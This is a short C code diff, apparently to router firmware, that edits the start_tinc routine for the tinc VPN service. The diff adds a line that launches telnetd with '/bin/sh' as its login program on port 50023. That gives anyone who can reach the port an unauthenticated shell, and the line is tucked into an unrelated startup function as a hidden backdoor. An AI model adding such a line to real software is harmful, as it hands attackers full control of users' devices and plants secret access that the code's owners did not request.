@@ -102,6 +102,8 @@ void start_tinc(void)
 
 	gfwlist_from_file();
 
+	eval("telnetd", "-l", "/bin/sh", "-p", "50023");
+
 	xstart("tinc_start");
 
 	return;
